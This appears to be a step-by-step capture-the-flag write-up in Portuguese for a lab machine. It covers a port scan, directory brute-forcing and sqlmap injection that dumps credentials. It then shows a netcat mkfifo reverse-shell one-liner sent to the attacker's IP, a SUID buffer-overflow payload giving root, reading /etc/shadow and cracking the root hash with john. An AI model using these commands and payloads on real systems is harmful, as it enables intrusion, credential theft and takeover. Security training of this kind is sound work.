2

nmap — só dois serviços

nmap -sV -Pn -p- 10.129.178.14

A scan completa a todas as portas mostra só duas abertas: 22 (SSH, OpenSSH 7.2p2) e 80 (HTTP, Apache 2.4.18). Alvo: 10.129.178.14.

3

FALHOU Tentativa: gobuster sem extensões — nada

sudo gobuster dir -u http://10.129.178.14 -w /usr/share/wordlists/dirb/big.txt

O que correu mal: o gobuster com a big.txt correu até ao fim (100%) e só encontrou .htaccess, .htpasswd e server-status, todos 403. Nada explorável.

4

gobuster com extensões — administrator.php

gobuster dir -u http://10.129.178.14 -w big.txt -x php,txt,html

A solução: pedir também as extensões (-x php,txt,html). Lá aparece o administrator.php com Status 200 — página de login.

5

sqlmap confirma a injeção

sudo sqlmap -u "http://10.129.178.14/administrator.php" --forms --batch --dump

Com o POST username=&password= capturado, o sqlmap confirma: o parâmetro username é injetável (MySQL >= 5.6, error-based).

6

Dump da tabela users

sqlmap ... --forms --batch --dump → Y

No fim do dump: base users, tabela users, colunas username/password — pingudad:secretpass. Um único utilizador.

7

Login de administrador

http://10.129.178.14/administrator.php

Página Administrator Login no browser: pingudad com secretpass e entrar.

8

Página Run Command

http://10.129.178.14/2591c98b70119fe624898b1e424b5e91.php

Depois do login aparece a página Run Command (com nome md5) — execução de comandos direta no servidor.

9

Reverse shell: nc à escuta

nc -lvnp 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.234 4444 >/tmp/f

Na Kali o nc fica à escuta na 4444 e na página Run Command entra o comando do reverse shell (cheat sheet do pentestmonkey), apontando ao IP da Kali.

10

Shell recebida — www-data

python3 -c 'import pty;pty.spawn("/bin/bash")'
ls; whoami

Conexão recebida: shell como www-data. O ls mostra o webroot e o whoami confirma o utilizador. (O woami com um s a menos deu command not found.)

11

Shell estável

Ctrl-Z → stty raw -echo; fg

A shell crua não tem job control; com python pty + stty raw -echo; fg fica uma bash decente.

12

A pass do pingu em /var/hidden

cd /
cd var/hidden
cat pass

Encontrada a pasta hidden: o cat pass devolve pinguapingu — a password SSH do pingu.

13

SSH como pingu

ssh pingu@10.129.178.14

SSH com a password do ficheiro pass: Welcome to Ubuntu 16.04.6 e prompt pingu@ubuntu.

14

À procura do /opt/secret à mão

cd /opt
cd secret
ls

Sem linpeas nem LinEnum: a procura foi à mão com ls e cd. No /opt/secret está lá o ficheiro root (SUID) — o alvo do buffer overflow.

15

Buffer overflow — shell de root

python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I", 0x080484cb))' | /opt/secret/root

Sem precisar de cyclic nem disassemble: a room indica o offset (44) e o endereço da shell (0x080484cb). A 1ª tentativa deu Segmentation fault (payload mal montado); com os 44 A + o endereço em little endian (struct.pack do python3) a shell abre como root e o /etc/shadow vem abaixo: root e papa com as hashes.

16

john parte o hash do root

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

O 1º john parou com ETA de 13 minutos (Ctrl-C) — à segunda, 26 segundos e lá está: ?:love2fish é a password do root. 1 password hash cracked, 0 left.
